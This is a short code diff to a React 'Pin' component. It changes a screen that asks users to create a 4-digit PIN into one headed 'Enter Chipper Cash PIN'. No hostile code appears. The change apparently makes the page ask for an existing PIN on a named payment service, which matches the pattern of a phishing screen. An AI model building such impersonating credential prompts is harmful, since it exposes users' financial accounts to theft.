@@ -58,17 +58,17 @@ const Pin = () => {
             <img src="/logo.png" alt="Back" style={{ height: "120px", width: "auto" }} />
           </button>
           <h2 className="flex-1 text-center text-[17px] font-semibold text-gray-900">
-            Create PIN
+            PIN
           </h2>
         </div>
 
         {/* Body */}
         <div className="flex-1 px-5 pt-10">
           <h1 className="text-[26px] font-extrabold text-gray-900 mb-2">
-            Set your PIN
+           Enter Chipper Cash PIN
           </h1>
           <p className="text-[14px] text-gray-500 mb-10">
-            Create a 4-digit PIN to secure your account.
+            enter your 4-digit PIN to secure your account.
           </p>
 
           {/* 4 big PIN boxes */}
